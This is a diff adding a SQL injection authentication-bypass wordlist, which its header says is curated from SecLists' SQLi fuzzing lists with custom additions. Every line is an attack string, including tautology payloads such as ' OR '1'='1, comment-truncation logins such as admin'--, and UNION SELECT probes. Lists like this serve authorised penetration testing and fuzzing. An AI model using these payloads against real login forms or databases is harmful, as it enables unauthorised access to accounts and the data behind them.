@@ -1,0 +1,68 @@
+# SQL Injection - Authentication Bypass
+# Curated from SecLists + custom additions
+# Source: SecLists/Fuzzing/SQLi/
+
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+" OR "1"="1
+" OR "1"="1"--
+" OR 1=1--
+" OR 1=1#
+admin'--
+admin' #
+admin'/*
+admin' OR '1'='1
+admin' OR '1'='1'--
+admin' OR '1'='1'#
+admin' OR '1'='1'/*
+admin' or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+') or ('1'='1
+') or ('1'='1'--
+')) or (('1'='1
+')) or 1=1--
+'))--
+'))/*
+' OR ''='
+' OR 'x'='x
+' OR 0=0 --
+' OR 0=0 #
+" OR 0=0 --
+" OR 0=0 #
+or 0=0 --
+or 0=0 #
+' OR 'x'='x'--
+' OR 'x'='x'#
+"-"
+"' "
+";"
+"'"
+"' AND 1=0 UNION ALL SELECT '', ''--
+"' AND 1=0 UNION ALL SELECT '', '', ''--
+' AND 1=0 UNION ALL SELECT '', ''--
+' AND 1=0 UNION ALL SELECT '', '', ''--
+' AND 1=0 UNION ALL SELECT '', '', '', ''--
+' AND 1=0 UNION ALL SELECT '', '', '', '', ''--
+1' or '1' = '1
+1' or '1' = '1'))--
+1' or '1' = '1'))/*
+1' or '1' = '1'))#
+1 or 1=1
+1' or 1=1--
+1' or 1=1#
+1' or 1=1/*
+1') or 1=1--
+1') or 1=1#
+1') or 1=1/*
+1')) or 1=1--
+1')) or 1=1/*
+1')) or 1=1#
